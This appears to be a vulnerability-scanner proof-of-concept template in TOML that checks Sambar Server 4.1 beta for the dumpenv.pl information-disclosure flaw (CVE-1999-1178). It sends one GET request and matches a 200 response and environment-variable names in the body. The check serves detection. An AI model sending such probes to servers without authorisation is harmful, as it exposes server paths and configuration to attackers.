[info]
author = "ave"
description = "检测 Sambar Server 4.1 beta 是否存在 dumpenv.pl 信息泄露漏洞，攻击者可通过 HTTP GET 请求访问该脚本获取服务器环境变量、系统路径及配置等敏感信息。"
id = "POC-AVE-1999-1377"
name = "Sambar Server 4.1 beta dumpenv.pl 信息泄露漏洞 PoC"
severity = "medium"
tags = ["ave-1999-1377"]
vuln_id = [
    "CVE-1999-1178",
    "AVE-1999-1377",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/dumpenv.pl"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "SERVER_NAME",
    "SERVER_PORT",
    "PATH",
    "DOCUMENT_ROOT",
]
